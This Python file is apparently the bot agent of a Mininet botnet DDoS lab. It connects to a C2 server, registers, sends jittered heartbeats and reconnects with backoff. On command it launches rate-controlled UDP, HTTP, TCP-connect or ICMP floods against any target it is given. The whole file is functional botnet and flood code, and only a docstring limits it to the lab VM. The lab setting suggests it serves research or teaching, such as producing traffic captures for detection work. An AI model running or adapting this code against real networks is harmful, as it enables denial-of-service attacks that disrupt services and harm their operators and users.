#!/usr/bin/env python3
"""
Bot agent for the Botnet DDoS lab.

Each Mininet bot host (botA1, botA2, ..., botE15) runs this script.
It opens a TCP control channel to the C2 server (default 10.0.200.10:6667),
registers itself, sends periodic heartbeats with jitter, and executes
attack commands issued by the C2.

Wire protocol is documented in ``botnet/c2.py``.

Attack methods (pure Python, no external dependencies):

    udp     UDP datagram flood toward target:port (default port 53).
    http    Repeated HTTP GET / requests over short TCP connections
            toward target:port (default port 80).
    tcp     TCP-connect flood (open + close) toward target:port
            (default port 80) -- exercises connection tracking.
    icmp    ICMP echo flood via ``ping -i`` (uses /bin/ping, root only).

Each method honours a per-bot ``rate_pps`` budget (a token-bucket-like
sleep loop) so that aggregate DDoS volume on the target scales linearly
with the number of attacking bots.

This script is for use **inside the controlled Mininet VM only**.
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import random
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from typing import Optional

DEFAULT_C2_HOST = "10.0.200.10"
DEFAULT_C2_PORT = 6667
HEARTBEAT_INTERVAL = 30.0          # seconds, jittered +/- 25 %
RECONNECT_BACKOFF_MIN = 2.0
RECONNECT_BACKOFF_MAX = 30.0
RECV_BUFFER = 4096
SOCKET_TIMEOUT = 60.0

VALID_METHODS = ("udp", "http", "tcp", "icmp")


# ---------------------------------------------------------------------------
# Attack worker
# ---------------------------------------------------------------------------
class AttackWorker:
    """Runs a single attack in its own thread until duration or stop."""

    def __init__(
        self,
        log: logging.Logger,
        method: str,
        target: str,
        port: Optional[int],
        duration: int,
        rate_pps: int,
    ) -> None:
        self.log = log
        self.method   = method
        self.target   = target
        self.port     = port
        self.duration = max(1, int(duration))
        self.rate_pps = max(1, int(rate_pps))
        self._stop    = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.icmp_proc: Optional[subprocess.Popen] = None

    # -- lifecycle -----------------------------------------------------
    def start(self) -> None:
        self._thread = threading.Thread(
            target=self._run, name=f"attack-{self.method}", daemon=True
        )
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self.icmp_proc is not None:
            try:
                self.icmp_proc.terminate()
            except OSError:
                pass

    def is_alive(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    # -- core loop -----------------------------------------------------
    def _run(self) -> None:
        deadline = time.time() + self.duration
        self.log.info(
            "attack START %s -> %s:%s rate=%d pps dur=%ds",
            self.method, self.target, self.port, self.rate_pps, self.duration,
        )
        try:
            if self.method == "udp":
                self._udp_flood(deadline)
            elif self.method == "http":
                self._http_flood(deadline)
            elif self.method == "tcp":
                self._tcp_flood(deadline)
            elif self.method == "icmp":
                self._icmp_flood(deadline)
            else:
                self.log.error("unknown attack method: %s", self.method)
        except Exception as exc:                       # noqa: BLE001
            self.log.exception("attack crashed: %s", exc)
        finally:
            self.log.info("attack END   %s -> %s", self.method, self.target)

    # -- methods -------------------------------------------------------
    def _interval(self) -> float:
        return 1.0 / self.rate_pps

    def _udp_flood(self, deadline: float) -> None:
        port = self.port or 53
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        payload = b"X" * 512                           # 512 B datagrams
        interval = self._interval()
        next_send = time.time()
        while not self._stop.is_set() and time.time() < deadline:
            try:
                sock.sendto(payload, (self.target, port))
            except OSError:
                pass                                   # buffer full / down
            next_send += interval
            sleep = next_send - time.time()
            if sleep > 0:
                time.sleep(sleep)
        sock.close()

    def _http_flood(self, deadline: float) -> None:
        port = self.port or 80
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: Mozilla/5.0 (Mininet bot)\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n\r\n"
        ).encode("ascii")
        interval = self._interval()
        next_send = time.time()
        while not self._stop.is_set() and time.time() < deadline:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2.0)
                    s.connect((self.target, port))
                    s.sendall(request)
                    try:
                        s.recv(256)                    # read & discard
                    except OSError:
                        pass
            except OSError:
                pass
            next_send += interval
            sleep = next_send - time.time()
            if sleep > 0:
                time.sleep(sleep)

    def _tcp_flood(self, deadline: float) -> None:
        port = self.port or 80
        interval = self._interval()
        next_send = time.time()
        while not self._stop.is_set() and time.time() < deadline:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect_ex((self.target, port))
                s.close()
            except OSError:
                pass
            next_send += interval
            sleep = next_send - time.time()
            if sleep > 0:
                time.sleep(sleep)

    def _icmp_flood(self, deadline: float) -> None:
        ping = shutil.which("ping")
        if ping is None:
            self.log.error("icmp method needs /bin/ping")
            return
        # ping -i <interval> -W 1 <target>
        interval = max(0.001, 1.0 / self.rate_pps)
        try:
            self.icmp_proc = subprocess.Popen(
                [ping, "-i", f"{interval:.3f}", "-W", "1", self.target],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except OSError as exc:
            self.log.error("ping spawn failed: %s", exc)
            return
        while not self._stop.is_set() and time.time() < deadline:
            if self.icmp_proc.poll() is not None:
                break
            time.sleep(0.5)
        if self.icmp_proc.poll() is None:
            self.icmp_proc.terminate()
            try:
                self.icmp_proc.wait(timeout=2.0)
            except subprocess.TimeoutExpired:
                self.icmp_proc.kill()


# ---------------------------------------------------------------------------
# Bot client
# ---------------------------------------------------------------------------
class Bot:
    def __init__(self, bot_id: str, c2_host: str, c2_port: int) -> None:
        self.bot_id   = bot_id
        self.c2_host  = c2_host
        self.c2_port  = c2_port
        self.start_ts = time.time()
        self.log      = logging.getLogger(f"bot[{bot_id}]")
        self._sock: Optional[socket.socket] = None
        self._send_lock = threading.Lock()
        self._stop = threading.Event()
        self._attack: Optional[AttackWorker] = None

    # -- main entrypoint ----------------------------------------------
    def run(self) -> None:
        signal.signal(signal.SIGTERM, self._on_signal)
        signal.signal(signal.SIGINT,  self._on_signal)

        backoff = RECONNECT_BACKOFF_MIN
        while not self._stop.is_set():
            try:
                self._connect()
                backoff = RECONNECT_BACKOFF_MIN        # reset on success
                hb = threading.Thread(
                    target=self._heartbeat_loop, name="heartbeat", daemon=True,
                )
                hb.start()
                self._recv_loop()
            except (ConnectionRefusedError, socket.timeout, OSError) as exc:
                self.log.warning("C2 connection failed: %s", exc)
            finally:
                self._close_sock()
                self._stop_attack()
            if self._stop.is_set():
                break
            sleep_for = backoff + random.uniform(0, backoff)
            self.log.info("reconnect in %.1fs", sleep_for)
            self._stop.wait(sleep_for)
            backoff = min(backoff * 2, RECONNECT_BACKOFF_MAX)

        self._stop_attack()
        self.log.info("bot exit")

    def _on_signal(self, signum, _frame) -> None:
        self.log.info("signal %d received, shutting down", signum)
        self._stop.set()
        self._close_sock()

    # -- networking ---------------------------------------------------
    def _connect(self) -> None:
        self.log.info("connecting to C2 %s:%d", self.c2_host, self.c2_port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect((self.c2_host, self.c2_port))
        self._sock = s
        local_ip = s.getsockname()[0]
        self._send({"type": "register", "bot_id": self.bot_id, "ip": local_ip})
        self.log.info("registered as %s (ip=%s)", self.bot_id, local_ip)

    def _close_sock(self) -> None:
        if self._sock is not None:
            try:
                self._sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None

    def _send(self, message: dict) -> bool:
        if self._sock is None:
            return False
        line = (json.dumps(message) + "\n").encode("utf-8")
        with self._send_lock:
            try:
                self._sock.sendall(line)
                return True
            except OSError as exc:
                self.log.warning("send failed: %s", exc)
                return False

    def _heartbeat_loop(self) -> None:
        while not self._stop.is_set() and self._sock is not None:
            jitter = random.uniform(0.75, 1.25)
            self._stop.wait(HEARTBEAT_INTERVAL * jitter)
            if self._stop.is_set() or self._sock is None:
                break
            uptime = time.time() - self.start_ts
            if not self._send({
                "type": "heartbeat", "bot_id": self.bot_id, "uptime": uptime,
            }):
                break

    def _recv_loop(self) -> None:
        assert self._sock is not None
        buf = b""
        while not self._stop.is_set():
            try:
                chunk = self._sock.recv(RECV_BUFFER)
            except socket.timeout:
                continue
            except OSError as exc:
                self.log.warning("recv error: %s", exc)
                break
            if not chunk:
                self.log.info("C2 closed connection")
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                if not line.strip():
                    continue
                try:
                    msg = json.loads(line.decode("utf-8", "replace"))
                except json.JSONDecodeError:
                    self.log.warning("bad JSON from C2")
                    continue
                self._dispatch(msg)

    # -- command dispatch ---------------------------------------------
    def _dispatch(self, msg: dict) -> None:
        mtype = msg.get("type")
        if mtype == "ping":
            self._send({"type": "ack", "bot_id": self.bot_id,
                        "cmd_id": "ping", "status": "ok", "detail": "pong"})
        elif mtype == "attack":
            self._handle_attack(msg)
        elif mtype == "stop":
            self._stop_attack()
            self._send({"type": "ack", "bot_id": self.bot_id,
                        "cmd_id": msg.get("cmd_id", "?"),
                        "status": "stopped", "detail": ""})
        elif mtype == "quit":
            self.log.info("C2 told us to quit")
            self._stop.set()
            self._close_sock()
        else:
            self.log.warning("unknown message from C2: %s", mtype)

    def _handle_attack(self, msg: dict) -> None:
        cmd_id   = str(msg.get("cmd_id", "?"))
        method   = str(msg.get("method", "")).lower()
        target   = str(msg.get("target", ""))
        duration = int(msg.get("duration", 30))
        rate     = int(msg.get("rate_pps", 100))
        port     = msg.get("port")
        port     = int(port) if port is not None else None

        if method not in VALID_METHODS or not target:
            self._send({"type": "ack", "bot_id": self.bot_id, "cmd_id": cmd_id,
                        "status": "error", "detail": "bad attack params"})
            return

        # Stop a previous attack before starting a new one.
        self._stop_attack()
        worker = AttackWorker(self.log, method, target, port, duration, rate)
        worker.start()
        self._attack = worker
        self._send({"type": "ack", "bot_id": self.bot_id, "cmd_id": cmd_id,
                    "status": "started",
                    "detail": f"{method} {target} dur={duration} rate={rate}"})

    def _stop_attack(self) -> None:
        if self._attack is not None and self._attack.is_alive():
            self._attack.stop()
        self._attack = None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def _resolve_bot_id(arg: Optional[str]) -> str:
    if arg:
        return arg
    env = os.environ.get("BOT_ID")
    if env:
        return env
    # Mininet does NOT unshare the UTS namespace, so socket.gethostname()
    # returns the host VM's name (e.g. "mininet-vm") for every bot, which
    # would cause every bot to collide on the same C2 dict key. Each
    # Mininet host *does* have its own network namespace with an interface
    # named "<hostname>-eth0" -- use that to recover the real identity.
    try:
        for iface in sorted(os.listdir("/sys/class/net")):
            if iface.endswith("-eth0"):
                return iface[: -len("-eth0")]
    except OSError:
        pass
    return socket.gethostname()


def _setup_logging(verbosity: str, log_file: Optional[str]) -> None:
    level = getattr(logging, verbosity.upper(), logging.INFO)
    handlers: list[logging.Handler] = [logging.StreamHandler(sys.stderr)]
    if log_file:
        handlers.append(logging.FileHandler(log_file))
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)-7s %(name)s | %(message)s",
        datefmt="%H:%M:%S",
        handlers=handlers,
    )


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.split("\n", 1)[0])
    p.add_argument("--c2-host", default=DEFAULT_C2_HOST,
                   help="C2 server address (default: %(default)s)")
    p.add_argument("--c2-port", type=int, default=DEFAULT_C2_PORT,
                   help="C2 server port (default: %(default)s)")
    p.add_argument("--bot-id", default=None,
                   help="override bot identifier (default: hostname)")
    p.add_argument("--log-file", default=None,
                   help="also write log lines to this file")
    p.add_argument("--log-level", default="info",
                   choices=["debug", "info", "warning", "error"])
    args = p.parse_args()

    _setup_logging(args.log_level, args.log_file)

    # Random startup delay so 45 bots don't hit the C2 in a thundering
    # herd; produces more realistic registration spread in PCAPs.
    delay = random.uniform(0, 5)
    time.sleep(delay)

    bot_id = _resolve_bot_id(args.bot_id)
    Bot(bot_id, args.c2_host, args.c2_port).run()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
